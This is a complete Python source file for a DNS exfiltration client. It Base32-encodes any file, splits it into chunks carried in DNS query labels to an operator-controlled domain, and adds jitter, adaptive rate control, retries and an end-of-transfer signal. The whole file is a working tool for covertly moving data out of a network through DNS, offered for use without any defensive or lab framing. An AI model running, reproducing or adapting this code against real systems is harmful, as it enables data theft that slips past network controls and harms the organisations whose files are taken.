#!/usr/bin/env python3

import argparse
import logging
import os
import random
import time
from typing import List, Dict, Optional

import dns.resolver

from config import ServerConfig, load_config
from encoding_utils import (
    encode_base32_no_padding,
    generate_session_id,
    calculate_checksum,
    is_valid_base32,
)
from logger import setup_logger


class DNSExfiltrationClient:
    """
    DNS exfiltration client.

    The client reads a file as bytes, Base32-encodes it, and sends it in
    fixed-size chunks using DNS A queries with the following label format:

        <session>-<seq>-<chunk>-<checksum>.<domain>

    where:
    - <session> is a 6-character Base32 session ID
    - <seq> is a 4-digit zero-padded sequence number (0000-9999)
    - <chunk> is a slice of the Base32-encoded file contents (40-50 chars)
    - <checksum> is a 3-character Base32 checksum
    - <domain> is the user-supplied domain/zone handled by the exfiltration server
    """

    # Maximum length of a single DNS label per RFC is 63 characters.
    _DNS_LABEL_MAX_LEN = 63

    def __init__(self, config: ServerConfig, logger) -> None:
        self.config = config
        self.logger = logger

        # Single resolver instance reused for all queries.
        self.resolver = dns.resolver.Resolver()

        # Calculate chunk size based on new format
        # Format: <session>-<seq>-<chunk>-<checksum>
        # Overhead: session_len + seq_len + checksum_len + 3 hyphens
        overhead = (
            self.config.session_id_length
            + 4  # sequence number (4 digits)
            + self.config.checksum_length
            + 3  # 3 hyphens
        )
        max_chunk_size = self._DNS_LABEL_MAX_LEN - overhead
        
        # Use configured chunk_size but ensure it fits
        self.chunk_size = min(max_chunk_size, self.config.chunk_size)
        if self.chunk_size < 40:
            self.chunk_size = 40
            self.logger.warning(
                f"Chunk size adjusted to minimum 40 characters "
                f"(calculated max: {max_chunk_size})"
            )

        self.total_sent = 0
        self.session_id: Optional[str] = None
        
        # Rate control state
        self.current_rate = config.base_rate_limit
        self.consecutive_errors = 0
        self.last_query_time = 0.0
        self.response_times: List[float] = []

    def setup_resolver(self, nameservers: List[str], port: int) -> None:
        """Configure the DNS resolver with the specified nameservers and port."""
        try:
            resolved_nameservers = []
            for ns in nameservers:
                try:
                    resolved = dns.resolver.resolve(ns, 'A')
                    resolved_nameservers.extend([str(r) for r in resolved])
                except Exception as e:
                    self.logger.debug(f"Could not resolve {ns} as A: {e}")
                    resolved_nameservers.append(ns)
            
            self.resolver.nameservers = resolved_nameservers
            self.resolver.port = port
            self.logger.info(f"Configured resolver with nameservers: {resolved_nameservers}, port: {port}")
        except Exception as e:
            self.logger.error(f"Failed to configure resolver: {e}")
            raise

        # Configure reasonable per-query timeouts on the shared resolver.
        self.resolver.timeout = 2.0
        self.resolver.lifetime = 2.0

    def chunk_data(self, raw_bytes: bytes) -> List[str]:
        """
        Base32-encode the raw bytes and split them into fixed-size chunks.

        The chunks are Base32 strings (no padding) safe to embed in a DNS label.
        """
        encoded_data = encode_base32_no_padding(raw_bytes)
        return [
            encoded_data[i : i + self.chunk_size]
            for i in range(0, len(encoded_data), self.chunk_size)
        ]

    def _calculate_delay(self) -> float:
        """
        Calculate delay between queries with adaptive rate control and jitter.
        
        Returns:
            Delay in seconds
        """
        base_delay = 60.0 / self.current_rate
        
        # Add exponential backoff if there are consecutive errors
        if self.consecutive_errors > 0:
            backoff_multiplier = min(2.0 ** self.consecutive_errors, 16.0)
            base_delay *= backoff_multiplier
        
        # Add jitter if enabled (up to 20% of base delay)
        if self.config.enable_jitter:
            jitter = random.uniform(-0.1, 0.1) * base_delay
            base_delay += jitter
        
        return max(0.01, base_delay)  # Minimum 10ms delay

    def _update_rate(self, response_time: float) -> None:
        """
        Update rate based on response time (adaptive rate control).
        
        Args:
            response_time: Time taken for DNS query in seconds
        """
        if not self.config.enable_adaptive_rate:
            return
        
        self.response_times.append(response_time)
        # Keep only last 10 response times
        if len(self.response_times) > 10:
            self.response_times.pop(0)
        
        avg_response_time = sum(self.response_times) / len(self.response_times)
        
        # If response time is high, reduce rate; if low, increase rate
        if avg_response_time > 1.0:  # Slow responses
            self.current_rate = max(
                self.config.base_rate_limit * 0.5,
                self.current_rate * 0.9
            )
        elif avg_response_time < 0.1:  # Fast responses
            self.current_rate = min(
                self.config.max_rate_limit,
                self.current_rate * 1.1
            )

    def validate_file(self, file_path: str) -> None:
        """Validate the input file."""
        if not os.path.exists(file_path):
            raise FileNotFoundError(f"File not found: {file_path}")
        
        file_size = os.path.getsize(file_path)
        if file_size > self.config.max_total_size:
            raise ValueError(
                f"File size ({file_size} bytes) exceeds maximum allowed size "
                f"({self.config.max_total_size} bytes)"
            )

    def send_chunk(
        self, chunk_id: int, chunk: str, domain: str, max_retries: int = 3
    ) -> bool:
        """
        Send a single chunk of data via DNS query with retry logic.
        
        Args:
            chunk_id: Sequence number of the chunk
            chunk: Base32-encoded chunk data
            domain: Domain name for the query
            max_retries: Maximum number of retry attempts
            
        Returns:
            True if chunk was sent successfully, False otherwise
        """
        if not self.session_id:
            self.session_id = generate_session_id(self.config.session_id_length)
            self.logger.info(f"Generated session ID: {self.session_id}")
        
        # Calculate checksum for this chunk
        checksum = calculate_checksum(chunk, self.config.checksum_length)
        
        # Format: <session>-<seq>-<chunk>-<checksum>
        seq_str = str(chunk_id).zfill(4)
        label = f"{self.session_id}-{seq_str}-{chunk}-{checksum}"
        query_name = f"{label}.{domain}"

        # Verify the label length
        if len(label) > self._DNS_LABEL_MAX_LEN:
            self.logger.error(
                f"Chunk {chunk_id} label too long: {len(label)} characters "
                f"(max {self._DNS_LABEL_MAX_LEN})"
            )
            return False

        # Validate Base32 characters
        if not is_valid_base32(chunk):
            self.logger.error(f"Chunk {chunk_id} contains invalid Base32 characters")
            return False

        # Rate limiting: wait if needed
        if self.last_query_time > 0:
            elapsed = time.time() - self.last_query_time
            delay = self._calculate_delay()
            if elapsed < delay:
                time.sleep(delay - elapsed)

        # Retry loop
        for attempt in range(max_retries + 1):
            try:
                start_time = time.time()
                self.logger.debug(f"Sending chunk {chunk_id} (attempt {attempt + 1}) to {query_name}")

                # Send DNS query
                self.resolver.resolve(query_name, "A")
                
                # Success
                response_time = time.time() - start_time
                self._update_rate(response_time)
                self.consecutive_errors = 0
                self.last_query_time = time.time()
                self.total_sent += len(chunk)
                self.logger.info(f"Successfully sent chunk {chunk_id}")
                return True
                
            except dns.resolver.NXDOMAIN:
                # NXDOMAIN is acceptable - server received the query
                response_time = time.time() - start_time
                self._update_rate(response_time)
                self.consecutive_errors = 0
                self.last_query_time = time.time()
                self.total_sent += len(chunk)
                self.logger.info(f"Successfully sent chunk {chunk_id} (NXDOMAIN response)")
                return True
                
            except dns.resolver.NoAnswer:
                # NoAnswer is acceptable - server received the query
                response_time = time.time() - start_time
                self._update_rate(response_time)
                self.consecutive_errors = 0
                self.last_query_time = time.time()
                self.total_sent += len(chunk)
                self.logger.info(f"Successfully sent chunk {chunk_id} (NoAnswer response)")
                return True
                
            except Exception as e:
                self.consecutive_errors += 1
                if attempt < max_retries:
                    retry_delay = self._calculate_delay() * (attempt + 1)
                    self.logger.warning(
                        f"DNS query failed for chunk {chunk_id} (attempt {attempt + 1}): {e}. "
                        f"Retrying in {retry_delay:.2f}s..."
                    )
                    time.sleep(retry_delay)
                else:
                    self.logger.error(
                        f"DNS query failed for chunk {chunk_id} after {max_retries + 1} attempts: {e}"
                    )
                    return False

        return False

    def send_done(self, total_chunks: int, domain: str) -> bool:
        """
        Send DONE control query so server knows transfer is complete.
        Label format: <session>-DONE-<total_chunks> (e.g. JKD3BR-DONE-0042).
        """
        if not self.session_id:
            return False
        total_str = str(total_chunks).zfill(4)
        label = f"{self.session_id}-DONE-{total_str}"
        query_name = f"{label}.{domain}"
        if len(label) > self._DNS_LABEL_MAX_LEN:
            self.logger.error("DONE label too long")
            return False
        try:
            self.resolver.resolve(query_name, "A")
            self.logger.info(f"Sent DONE (total chunks: {total_chunks})")
            return True
        except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer):
            self.logger.info("Sent DONE (NXDOMAIN/NoAnswer)")
            return True
        except Exception as e:
            self.logger.warning(f"DONE query failed: {e}")
            return False

    def exfiltrate_file(self, file_path: str, domain: str) -> bool:
        """
        Exfiltrate a file through DNS queries using Base32 encoding.

        Returns True if all chunks were sent successfully, False otherwise.
        """
        try:
            self.validate_file(file_path)

            # Generate session ID for this transfer
            self.session_id = generate_session_id(self.config.session_id_length)
            self.logger.info(f"Starting exfiltration with session ID: {self.session_id}")

            # Read as bytes so arbitrary binary files are supported.
            with open(file_path, "rb") as file:
                file_bytes = file.read()

            chunks = self.chunk_data(file_bytes)

            self.logger.info(
                f"Starting exfiltration of {file_path} "
                f"(session: {self.session_id}, {len(chunks)} chunks, "
                f"{len(file_bytes)} bytes raw, chunk size: {self.chunk_size} chars)"
            )

            success_count = 0
            failed_chunks: List[int] = []
            
            for i, chunk in enumerate(chunks):
                if self.send_chunk(i, chunk, domain):
                    success_count += 1
                    if success_count % 10 == 0 or success_count == len(chunks):
                        self.logger.info(
                            f"Progress: {success_count}/{len(chunks)} chunks sent "
                            f"({(success_count/len(chunks)*100):.1f}%)"
                        )
                else:
                    failed_chunks.append(i)

            success_rate = (success_count / len(chunks)) * 100
            self.logger.info(
                f"Exfiltration complete. Success rate: {success_rate:.2f}% "
                f"({success_count}/{len(chunks)} chunks)"
            )
            if success_count == len(chunks):
                self.send_done(len(chunks), domain)
                if self.session_id:
                    self.logger.info(
                        f"Session ID: {self.session_id}. "
                        f"On server, look for output file named {self.session_id}_*.bin in the output directory."
                    )
            if failed_chunks:
                self.logger.warning(f"Failed chunks: {failed_chunks}")

            return success_count == len(chunks)

        except Exception as e:
            self.logger.error(f"Exfiltration failed: {e}")
            return False


def parse_args():
    """Parse command line arguments."""
    parser = argparse.ArgumentParser(description="DNS exfiltration client.")
    parser.add_argument(
        "-f",
        "--file",
        required=True,
        help="Path to the file to exfiltrate.",
    )
    parser.add_argument(
        "--nameservers",
        default="127.0.0.1",
        help="Comma-separated list of nameservers. Default is '127.0.0.1'.",
    )
    parser.add_argument(
        "-d",
        "--domain",
        required=True,
        help="Domain to query data with. Example: example.com",
    )
    parser.add_argument(
        "-p",
        "--port",
        type=int,
        default=53,
        help="Server listening port.",
    )
    parser.add_argument(
        "-c",
        "--config",
        help="Path to configuration file.",
    )
    return parser.parse_args()


def main():
    """Main function to run the DNS exfiltration client."""
    logger = None
    try:
        # Setup logging first so it's always available in except
        logger = setup_logger()
        args = parse_args()
        config = load_config(args.config)
        
        # Create client
        client = DNSExfiltrationClient(config, logger)
        
        # Setup resolver
        nameservers = [ns.strip() for ns in args.nameservers.split(',')]
        client.setup_resolver(nameservers, args.port)
        
        # Start exfiltration
        success = client.exfiltrate_file(args.file, args.domain)
        
        if not success:
            logger.error("Exfiltration failed")
            exit(1)
            
    except Exception as e:
        if logger is not None:
            logger.error(f"Fatal error: {e}")
        else:
            logging.getLogger("DNSExfiltration").error(f"Fatal error: {e}")
        exit(1)

if __name__ == "__main__":
    main()
